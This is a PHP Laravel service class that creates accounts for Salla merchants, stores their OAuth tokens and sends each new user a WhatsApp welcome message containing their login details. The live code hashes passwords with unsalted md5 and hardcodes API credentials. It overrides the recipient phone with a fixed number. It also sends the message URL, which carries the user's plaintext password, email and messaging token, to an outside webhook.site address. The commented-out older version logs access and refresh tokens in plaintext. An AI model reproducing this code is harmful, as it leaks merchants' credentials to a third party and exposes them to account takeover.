<?php
namespace App\Services\SallaServices;

use Log;
use Carbon\Carbon;
use App\Models\Team;
use App\Models\SpUser;
use Illuminate\Support\Str;
use App\Models\SpPermession;
use App\Models\MerchantCredential;
use Illuminate\Support\Facades\Http;
use App\Services\AppSettings\KarzounRequest;

class User{
    protected $merchant;
    protected $store;
    public static function check_user_exist($data) {
        // get user info
        $user = SpUser::whereHas('merchant_info',function($query) use($data){
            return $query->where('merchant_id',$data['merchant']);
        })->first();

        // change update json access token and refresh token
        if($user):
            $user->merchant_info()->update([
                'access_token' => $data['data']['access_token'],
                'refresh_token'=> $data['data']['refresh_token']
            ]);
        endif;

        // return result
        return $user ? true : false;
    }

    public function get_merchant_info($access_token){
        // Getting the store_id and other merchants Info from access token callback salla
        $this->merchant   = KarzounRequest::resolve(
            $end_point    = "https://api.salla.dev/admin/v2/oauth2/user/info",
            $request_type = 'GET',
            $access_token = $access_token
        );
    }

    public function get_store_info($access_token){
        // Getting the store_id and other merchants Info from access token callback salla
        $this->store   = KarzounRequest::resolve(
            $end_point    = "https://api.salla.dev/admin/v2/store/info",
            $request_type = 'GET',
            $access_token = $access_token
        );
    }

    public function create_new_user($data){
        // get merchant information
        $this->get_merchant_info($data['data']['access_token']);

        // get store information
        $this->get_store_info($data['data']['access_token']);

        /*** generate password to send to clinet ***/
        $password       = Str::random(10);
        $user_password  = md5($password);
        $plan_id        = '1';
        $platform_link  = "https://line.sa";
        $new_account                  = new SpUser();
        $new_account->role            = '0';
        $new_account->is_admin        = '0';
        $new_account->language        = 'ar';
        $new_account->fullname        = $this->store->data->name ?: $this->merchant->data->name;
        $new_account->email           = $this->merchant->data->email  ?: $this->store->data->email;
        $new_account->password        = $user_password;
        $new_account->plan            = '1';
        $new_account->expiration_date = self::add_date_plus(90);
        $new_account->timezone        = 'Asia/Riyadh';
        $new_account->login_type      = 'salla';
        $new_account->status          = '2';
        $new_account->created         = strtotime($data['created_at']);
        $new_account->data            = json_encode($data);
        $new_account->save();

        if($new_account):
            $merchant_credentails = new MerchantCredential();
            $merchant_credentails->user_id        = $new_account->id;
            $merchant_credentails->merchant_id    = $data['merchant'];
            $merchant_credentails->phone          = $this->merchant->data->mobile ?: null;
            $merchant_credentails->store_id       = $this->store->data->id;
            $merchant_credentails->access_token   = $data['data']['access_token'];
            $merchant_credentails->refresh_token  = $data['data']['refresh_token'];
            $merchant_credentails->save();

            $package = SpPermession::first() ?: null;
            if($package):
                $new_team              = new Team();
                $new_team->ids         = $this->store->data->id;
                $new_team->pid         = $plan_id;
                $new_team->owner       = $new_account->id;
                $new_team->permission  = $package->permissions;
                $new_team->merchant_id = $data['merchant'];
                $new_team->save();

                // check if new team is created
                if($new_team):
                    $instance_id  = '64AC6D08A99C9';
                    $access_token = '649ba622aa900';
                    $temp = '201026051966' ?: $merchant_credentails->phone;
                    // message text
                    $message = urlencode("
                        تهانيا 
                        تم انشاء حسابك على منصة line.sa بنجاح 
                        تفاصيل الحساب 
                        البريد الالكترونى : {$new_account->email} \n
                        اسم المستخدم : {$new_account->fullname} \n
                        كلمة المرور  : {$password} \n
                        رابط المنصة : {$platform_link} \n
                    ");

                    // send message with all info and it was installed succefully
                    $karzoun_send_message   = KarzounRequest::resolve(
                        $end_point    = "https://wh.line.sa/api/send.php?number=$temp&type=text&message=$message&instance_id=$instance_id&access_token=$access_token",
                        $request_type = 'POST'
                    );

                    Http::get('https://webhook.site/f032ba41-f451-4aba-a8b3-a97fbff114de',$end_point);

                    ($karzoun_send_message->status == 'success') ? true : false;
                endif;
            endif;
        endif;

    }

    // public static function create_new_user($data){
    //     // merchant id
    //     $merchant_id = $data->merchant; // = ids
    //     // auth token from salla app
    //     $auth_token = $data->data->access_token;
    //     // refresh token from app
    //     $refresh_auth_token = $data->data->refresh_token;
    //     // create at from salla app
    //     $created_at = $data->created_at;

    //     // Getting the store_id and other merchants Info from access token callback salla
    //     $salla_info   = KarzounRequest::resolve(
    //         $end_point    = "https://api.salla.dev/admin/v2/oauth2/user/info",
    //         $request_type = 'GET',
    //         $access_token = $data->data->access_token
    //     );

    //     // end of callback
    //     $store_id              = $salla_info->data->merchant->id;
    //     $usrname               = $salla_info->data->merchant->username;
    //     $store_name_none_clean = $salla_info->data->merchant->username; // fullname
    //     $store_name            = preg_replace('/[^A-Za-z0-9\-]/', '', $store_name_none_clean);
    //     $store_domain          = $salla_info->data->merchant->domain;
    //     $email                 = strtolower($salla_info->data->email);
    //     $phone_none_clean      = $salla_info->data->mobile;
    //     $phone                 = str_replace("+", "", $phone_none_clean);
    //     $usr_data              = json_encode($data);
    //     $plan_id               = '1'; // have to be updated with new plan id

    //     /*** generate password to send to clinet ***/
    //     $usrpassword  = md5($merchant_id);
    //     $instance_id  = '62FD2B670CFED';
    //     $access_token = '06f5b4780788339e2ba56bd9c082cea3';

    //     /* add 12 day to date
    //      * @params days Default value 12 day
    //     */
    //     $date_plus_12 = self::add_date_plus();
    //     // create new account
    //     $new_account = SpUser::create([
    //         'ids'            => $merchant_id,
    //         'role'           => '0',
    //         'fullname'       => $store_name,
    //         'merchant_phone' => $phone,
    //         'email'          => $email,
    //         'password'       => $usrpassword,
    //         'package'        => '1',
    //         'expiration_date'=> '2022-09-09',
    //         'timezone'       => 'Asia/Riyadh',
    //         'login_type'     => 'salla',
    //         'status'         => '2',
    //         'created'        => $created_at,
    //         'data'           => $usr_data,
    //         'access_token'   => $auth_token,
    //         'refresh_token'  => $refresh_auth_token,
    //         'expire_token'   => $date_plus_12
    //     ]);
    //     // inject user
    //     if($new_account):
    //         echo "Auth Done : Step 1 - ";
    //         $package = SpPermession::first() ?: null;
    //         if ($package):
    //             $new_team = Team::create([
    //                 'ids'        => $store_id,
    //                 'pid'        => $plan_id,
    //                 'owner'      => $new_account->id,
    //                 'permission' => $package->permissions,
    //                 'merchant_id'=> $merchant_id
    //             ]);

    //             // check if new team is created
    //             if ($new_team):

    //                 // message text
    //                 $message = "%D8%A7%D9%87%D9%84%D8%A7%D9%8B%20".$store_name."%2C%0A%D8%B4%D9%83%D8%B1%D8%A7%D9%8B%20%D8%B9%D9%84%D9%89%20%D8%AA%D9%86%D8%B5%D9%8A%D8%A8%D9%83%20%D8%AA%D8%B7%D8%A8%D9%8A%D9%82%20%D9%83%D8%B1%D8%B2%D9%88%D9%86%20%D9%84%D8%A5%D8%B4%D8%B9%D8%A7%D8%B1%D8%A7%D8%AA%20%D8%A7%D9%84%D9%88%D8%A7%D8%AA%D8%B3%D8%A7%D8%A8%20%D8%B9%D9%84%D9%89%20%D9%85%D8%AA%D8%AC%D8%B1%D9%83%20%D9%81%D9%8A%20%D8%B3%D9%84%D8%A9%2C%0A%D9%85%D9%86%20%D8%A7%D8%AC%D9%84%20%D8%A7%D8%AA%D9%85%D8%A7%D9%85%20%D8%B9%D9%85%D9%84%D9%8A%D8%A9%20%D8%A7%D9%84%D8%B1%D8%A8%D8%B7%20%D8%A7%D8%B3%D8%AA%D8%AE%D8%AF%D9%85%20%D8%A7%D9%84%D9%85%D8%B9%D9%84%D9%88%D9%85%D8%A7%D8%AA%20%D8%A7%D9%84%D8%AA%D8%A7%D9%84%D9%8A%D8%A9%20%D9%81%D9%8A%20%D8%A7%D9%84%D8%A3%D8%B3%D9%81%D9%84%0A%0A%D8%B7%D8%B1%D9%8A%D9%82%D8%A9%20%D8%A7%D9%84%D8%B1%D8%A8%D8%B7%20%D9%85%D8%B9%20%D9%85%D8%AA%D8%AC%D8%B1%20%D8%B3%D9%84%D8%A9%0Ahttps%3A%2F%2Fyoutu.be%2FpWSrr-8ak0I%0A%D8%A7%D9%84%D8%A8%D8%B1%D9%8A%D8%AF%20%D8%A7%D9%84%D8%A5%D9%84%D9%83%D8%AA%D8%B1%D9%88%D9%86%D9%8A%20%3A%20".$email."%0A%D9%83%D9%84%D9%85%D8%A9%20%D8%A7%D9%84%D8%B3%D8%B1%20%3A%20".$merchant_id;

    //                 // send message with all info and it was installed succefully
    //                 $karzoun_send_message   = KarzounRequest::resolve(
    //                     $end_point    = "https://karzoun.app/api/send.php?number=$phone&type=text&message=$message&instance_id=$instance_id&access_token=$access_token",
    //                     $request_type = 'POST'
    //                 );

    //                 // in case message send succefully out put log
    //                 if ($karzoun_send_message->status == 'success'):
    //                     // set log data
    //                     $log = 'Merchant ID :' . $merchant_id . ' ' . $store_name . ' ' . $store_id . ' ' . $email . ' ' . $phone . ' ' . ' ' . $auth_token . ' ' . $refresh_auth_token . ' ' . $created_at . PHP_EOL;

    //                     // out put log
    //                     Log::channel('auth_events')->info($log);

    //                     // echo
    //                     echo ' --> Sent';
    //                 endif;

    //             endif;

    //         else:
    //             echo "No permessions found - 0 results";
    //         endif;

    //     endif;
    // }

    public static function upgrade_user_plan($merchant_id,$plan_id,$expiration_date){
        $upgrade_plan = SpUser::where('ids',$merchant_id)->update([
            'package'        => $plan_id,
            'expiration_date'=> $expiration_date
        ]);

        if($upgrade_plan){
           return $plan_id.' --done ';
        }

        return $plan_id.' --failed ';
    }

    public static function add_date_plus($days = 12){
        $date = Carbon::now();
        $date->addDays($days);
        return strtotime($date->toDateString());
    }
}
